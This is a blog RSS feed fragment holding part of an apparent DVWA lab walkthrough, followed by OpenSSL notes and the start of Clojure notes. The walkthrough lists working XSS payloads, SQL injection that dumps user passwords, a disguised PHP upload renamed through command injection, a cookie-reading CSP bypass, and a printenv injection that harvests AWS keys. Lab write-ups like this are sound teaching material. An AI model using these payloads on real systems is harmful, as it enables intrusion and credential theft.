+						document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;option value=&apos;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; lang &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&apos;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;decodeURI&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;/option&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+						document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&amp;lt;/option&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+					&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+					    
+					document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;option value=&apos;English&apos;&gt;English&amp;lt;/option&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+					document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;option value=&apos;French&apos;&gt;French&amp;lt;/option&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+					document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;option value=&apos;Spanish&apos;&gt;Spanish&amp;lt;/option&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+					document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;option value=&apos;German&apos;&gt;German&amp;lt;/option&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+				&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
+			&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;select&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We have to break out of the &lt;code class=&quot;language-text&quot;&gt;&amp;lt;select&gt;&lt;/code&gt; tag, and for that we have to, use the following command.
+Our input is &lt;code class=&quot;language-text&quot;&gt;lang&lt;/code&gt;	, from there,
+&lt;strong&gt;Attack :&lt;/strong&gt;&lt;code class=&quot;language-text&quot;&gt;&gt;&amp;lt;/option&gt;&amp;lt;/script&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(&quot;hacked&quot;)&gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;High&lt;/h2&gt;
+&lt;p&gt;The programmer has set it in such a way that, any other input we give other than the four languages will be defaulted to English.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Is there any input?&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;default&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;is_null&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;default&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;# White list the allowable languages&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;default&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;French&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;English&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;German&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;Spanish&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;token comment&quot;&gt;# ok&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;token function&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;location: ?default=English&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;	&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We should avoid sending the payload to the server, for blacklisting, so, we use the &lt;code class=&quot;language-text&quot;&gt;#&lt;/code&gt;
+&lt;strong&gt;Attack :&lt;/strong&gt; English#&lt;script&gt;alert(“hacked”)&lt;/script&gt;&lt;/p&gt;
+&lt;h1&gt;XSS REFLECTED&lt;/h1&gt;
+&lt;h2&gt;Low&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Attack :&lt;/strong&gt;  &lt;code class=&quot;language-text&quot;&gt;&amp;lt;script&gt;alert(&quot;hacked&quot;)&amp;lt;/script&gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Medium&lt;/h2&gt;
+&lt;p&gt;Some level of filtering has been done this time,&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&amp;lt;script&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;name&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;They have only replaced lowercase &lt;code class=&quot;language-text&quot;&gt;&amp;lt;script&gt;&lt;/code&gt;, which means, &lt;code class=&quot;language-text&quot;&gt;&amp;lt;SCRIPT&gt;&lt;/code&gt; will work!
+&lt;strong&gt;Attack :&lt;/strong&gt;  &lt;code class=&quot;language-text&quot;&gt;&amp;lt;SCRIPT&gt;alert(&quot;hacked&quot;)&amp;lt;/SCRIPT&gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;High&lt;/h2&gt;
+&lt;p&gt;Only script tags are being targetted by this programmer, use an img tag instead.
+&lt;strong&gt;Attack :&lt;/strong&gt; &lt;code class=&quot;language-text&quot;&gt;&amp;lt;img src=x onerror=alert(&quot;hacked&quot;)&gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h1&gt;XSS STORAGE&lt;/h1&gt;
+&lt;h2&gt;Low&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Attack :&lt;/strong&gt;  &lt;code class=&quot;language-text&quot;&gt;&amp;lt;script&gt;alert(&quot;hacked&quot;)&amp;lt;/sript&gt;&lt;/code&gt; (in Message)&lt;/p&gt;
+&lt;h2&gt;Medium&lt;/h2&gt;
+&lt;p&gt;Some level of filtering has been done in both input blocks, but the name tag has a weaker level of filtering.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Sanitize message input&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strip_tags&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$message&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;// Sanitize name input&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&amp;lt;script&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The strip_tags function is strong and removes all html, php tags. We can target the weaker &lt;code class=&quot;language-text&quot;&gt;name&lt;/code&gt; input field, but, the problem is the &lt;code class=&quot;language-text&quot;&gt;name&lt;/code&gt; field takes only 10 characters. To increase this number,&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ctrl + Shift + i&lt;/li&gt;
+&lt;li&gt;Find the input tag of the &lt;code class=&quot;language-text&quot;&gt;name&lt;/code&gt; field in the console,&lt;/li&gt;
+&lt;li&gt;Note, that it has a maxlength value set to 10, increase it to 50.&lt;/li&gt;
+&lt;li&gt;Attack the &lt;code class=&quot;language-text&quot;&gt;name&lt;/code&gt; field.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Attack :&lt;/strong&gt; &lt;code class=&quot;language-text&quot;&gt;&amp;lt;SCRIPT&gt;alert(&quot;hacked&quot;)&amp;lt;/SCRIPT&gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;High&lt;/h2&gt;
+&lt;p&gt;It is the same case as medium, but this time, there is too much focus on the script tag, so try img tags.
+&lt;strong&gt;Attack :&lt;/strong&gt; &lt;code class=&quot;language-text&quot;&gt;&amp;lt;img src=x onerror=alert(&quot;hacked&quot;)&gt;&lt;/code&gt; in Name&lt;/p&gt;
+&lt;h1&gt;File Upload&lt;/h1&gt;
+&lt;h2&gt;Low&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Create the following php file&lt;/li&gt;
+&lt;li&gt;Upload it&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string double-quoted-string&quot;&gt;&quot;PATH&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Access the file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Medium&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Create the php file&lt;/li&gt;
+&lt;li&gt;Save it as .png file&lt;/li&gt;
+&lt;li&gt;upload it&lt;/li&gt;
+&lt;li&gt;go to command injection&lt;/li&gt;
+&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;127.0.0.1 &amp;amp; copy ..\..\hackable\uploads\uploadmed.png ..\..\hackable\uploads\uploadmed.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;now go back to uploads and access the file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;High&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;The php file looks like&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;GIF98
+&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string single-quoted-string&quot;&gt;&apos;PATH&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Save it as .jpeg file&lt;/li&gt;
+&lt;li&gt;Upload it&lt;/li&gt;
+&lt;li&gt;go to command injection&lt;/li&gt;
+&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;127.0.0.1|copy ..\..\hackable\uploads\uploadhigh.jpeg ..\..\hackable\uploads\uploadhigh.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;now go back to uploads and access the file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;SQL Injection&lt;/h1&gt;
+&lt;h2&gt;Low&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Attack :&lt;/strong&gt; %’ or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
+(or)
+%’ or 1=1 union select null,version()#&lt;/p&gt;
+&lt;h2&gt;Medium&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Attack :&lt;/strong&gt; 1 or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users
+(or)
+1 or 1=1 union select null,version()&lt;/p&gt;
+&lt;h2&gt;High&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Click on &lt;code class=&quot;language-text&quot;&gt;Click here to change ID&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Attack :&lt;/strong&gt; %’ or 1=1 union select null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
+(or)
+%’ or 1=1 union select null,version()#&lt;/p&gt;
+&lt;h1&gt;CSP Bypass&lt;/h1&gt;
+&lt;h2&gt;Low&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;go to hastebin&lt;/li&gt;
+&lt;li&gt;make a file with contents&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token function&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cookie&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;Save and go to &lt;code class=&quot;language-text&quot;&gt;just text&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Paste the link in the input field and click go.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;AWS Cloud Attack Defense Command Injection&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Upload the file&lt;/li&gt;
+&lt;li&gt;Switch on proxy&lt;/li&gt;
+&lt;li&gt;Catch in burpsuite&lt;/li&gt;
+&lt;li&gt;Right click and send to repeater&lt;/li&gt;
+&lt;li&gt;add printenv to the end of the Filename&lt;/li&gt;
+&lt;li&gt;Collect the following from response
+&lt;ul&gt;
+&lt;li&gt;SESSION TOKEN&lt;/li&gt;
+&lt;li&gt;SECRET_ACCESS_KEY&lt;/li&gt;
+&lt;li&gt;ACCESS_KEY_ID&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Export them in the terminal in the same order&lt;/li&gt;
+&lt;li&gt;Run the following commands&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sh&quot;&gt;&lt;pre class=&quot;language-sh&quot;&gt;&lt;code class=&quot;language-sh&quot;&gt;aws s3 &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; s3://temporary-public-image-store
+aws s3 &lt;span class=&quot;token function&quot;&gt;cp&lt;/span&gt; s3://temporary-public-image-store/flag.txt &lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; flag.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h1&gt;Open SSL&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Install from &lt;a href=&quot;https://slproweb.com/products/Win32OpenSSL.html&quot;&gt;https://slproweb.com/products/Win32OpenSSL.html&lt;/a&gt; 5MB File&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ENCRYPTION:
+&lt;code class=&quot;language-text&quot;&gt;openssl enc -salt -aes-256-cbc -in file.txt -out enc.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;openssl enc -d -aes-256-cbc -in enc.txt -out dec.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;HASH:
+&lt;code class=&quot;language-text&quot;&gt;openssl dgst -sha256 file.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;openssl dgst -sha256 file.txt &gt; hash.txt&lt;/code&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Clojure Fundamentals]]></title><description><![CDATA[Dialect of Lisp, that runs on JVM, CLR and also targets JavaScript (Can be transpiled to JS).
+Many features were inherited from Lisp, but…]]></description><link>https://gatsbyglass.netlify.app/blog/clojure-notes/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/blog/clojure-notes/</guid><pubDate>Sat, 04 Mar 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Dialect of Lisp, that runs on JVM, CLR and also targets JavaScript (Can be transpiled to JS).
+Many features were inherited from Lisp, but also adds on to it. Created by Rich Hickey. It has a big emphasis on concurrency, it is built into the language.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dynamic Language
+&lt;ul&gt;
+&lt;li&gt;Flexibility&lt;/li&gt;
+&lt;li&gt;Interactivity (Using REPL)&lt;/li&gt;
+&lt;li&gt;Consise (they tend to be easier to write, less verbose)&lt;/li&gt;
+&lt;li&gt;Exploration&lt;/li&gt;
+&lt;li&gt;Focus on the problem&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Functional&lt;/li&gt;
+&lt;li&gt;Hosted on the JVM&lt;/li&gt;
+&lt;li&gt;Supports Concurrency&lt;/li&gt;
+&lt;li&gt;Open Source&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Functional Programming Languages&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Functions as first class objects : Functions are the same as a integer or a string or any other data structure, they can be created and modified on the fly. They can be passed as parameters and be returned by another function.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Compose simple functions together to obtain a function, that targets a more complex purpose.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Pure Function : A function for a set of arguements always returns the same output, and is not affected by anything else.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Immutability : It can’t be changed once it has been declared. It is important when concurrency comes into the picture. Avoids then need for locking a variable when multiple agents are needed to act on it.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Laziness : A programming language will only do, as much work as it is asked to do. In haskell, if &lt;code class=&quot;language-text&quot;&gt;i = 1+2&lt;/code&gt; , the operation won’t be performed until i is accessed. In clojure, it is not lazy in terms of mathematical operations, but it is in terms of sequences. We could generate a list of prime numbers.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Who uses Clojure ?&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Swym&lt;/li&gt;
+&lt;li&gt;Boeing&lt;/li&gt;
+&lt;li&gt;Cisco&lt;/li&gt;
+&lt;li&gt;Netflix&lt;/li&gt;
+&lt;li&gt;CitiGroup&lt;/li&gt;
+&lt;li&gt;LinkedIn&lt;/li&gt;
+&lt;li&gt;Walmart&lt;/li&gt;
+&lt;li&gt;Salesforce&lt;/li&gt;
+&lt;li&gt;HelpShift&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Why Clojure ?&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Expressive, Elegant&lt;/li&gt;
+&lt;li&gt;Good Performance
+&lt;ul&gt;
+&lt;li&gt;Useful for the same tasks Java is&lt;/li&gt;
+&lt;li&gt;Wrapper-free Java Access&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Powerful Extensibility&lt;/li&gt;
+&lt;li&gt;Functional Programming and Concurrency&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Clojure is a Lisp&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Dynamic&lt;/li&gt;
+&lt;li&gt;Code as data&lt;/li&gt;
+&lt;li&gt;Reader&lt;/li&gt;
+&lt;li&gt;Small Core (Lesser Syntax)&lt;/li&gt;
+&lt;li&gt;Sequences&lt;/li&gt;
+&lt;li&gt;Syntactic Abstraction&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Dynamic Development&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;REPL - read-eval-print-loop&lt;/li&gt;
+&lt;li&gt;Define functions on the fly&lt;/li&gt;
+&lt;li&gt;Load and Compile code at runtime&lt;/li&gt;
+&lt;li&gt;Introspection&lt;/li&gt;
+&lt;li&gt;Interactive Environment&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Atomic Data Types&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Arbitrary Precision Integers&lt;/li&gt;
+&lt;li&gt;Doubles - 1.234&lt;/li&gt;
+&lt;li&gt;BigDecimals - 1.234M&lt;/li&gt;
+&lt;li&gt;Ratios - 22/7&lt;/li&gt;
+&lt;li&gt;Strings - “fred” -&gt; Only double quotes permitted&lt;/li&gt;
+&lt;li&gt;Characters - \a \b \c&lt;/li&gt;
+&lt;li&gt;Symbols - fred, ethel&lt;/li&gt;
+&lt;li&gt;Keywords - :fred, :ethel&lt;/li&gt;
+&lt;li&gt;Booleans - true false
+&lt;ul&gt;
